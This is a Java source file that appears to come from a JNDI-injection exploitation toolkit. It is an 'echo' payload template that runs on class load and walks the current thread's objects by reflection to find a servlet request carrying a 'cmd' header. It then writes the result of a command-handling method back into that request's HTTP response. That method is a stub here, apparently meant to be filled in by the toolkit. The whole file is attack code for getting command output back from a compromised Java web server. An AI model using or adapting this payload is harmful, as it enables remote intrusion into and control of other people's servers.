package com.qi4l.jndi.template.echo;

public class AllEcho {
    public static String CMD_HEADER = "cmd";

    public static java.util.HashSet<Object> h = new java.util.HashSet<Object>();

    public static javax.servlet.http.HttpServletRequest r = null;

    public static javax.servlet.http.HttpServletResponse p = null;

    static {
        F(Thread.currentThread(), 0);
    }

    private static boolean i(Object obj) {
        if (obj == null || h.contains(obj)) {
            return true;
        }
        h.add(obj);
        return false;
    }

    private static void F(Object start, int depth) {
        Class n = start.getClass();
        do {
            java.lang.reflect.Field f = null;
            int                     l = n.getDeclaredFields().length;
            for (int i = 0; i < l; i++) {
                f = n.getDeclaredFields()[i];
                f.setAccessible(true);
                Object o = null;
                try {
                    o = f.get(start);
                    if (!o.getClass().isArray()) {
                        p(o, depth);
                    } else {
                        Object   q    = null;
                        Object[] objs = (Object[]) o;
                        int      len  = java.lang.reflect.Array.getLength(o);
                        for (int j = 0; j < len; j++) {
                            q = objs[j];
                            p(q, depth);
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        } while ((n = n.getSuperclass()) != null);
    }

    private static void p(Object o, int depth) {
        if (depth > 52 || (r != null && p != null)) {
            return;
        }
        if (!i(o)) {
            if (r == null && javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())) {
                r = (javax.servlet.http.HttpServletRequest) o;
                if (r.getHeader(CMD_HEADER) == null) {
                    r = null;
                } else {
                    try {
                        p = (javax.servlet.http.HttpServletResponse) r.getClass().getMethod("getResponse", new Class[]{}).invoke(r, new Object[]{});
                    } catch (Exception e) {
                        r = null;
                    }
                }
            }
            if (r != null && p != null) {
                try {
                    try {
                        p.getWriter().println(q(r.getHeader(CMD_HEADER)));
                    } catch (Exception ignored) {
                    }
                    p.getWriter().flush();
                    p.getWriter().close();
                } catch (Exception ignored) {
                }
                return;
            }
            F(o, depth + 1);
        }
    }

    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }
}
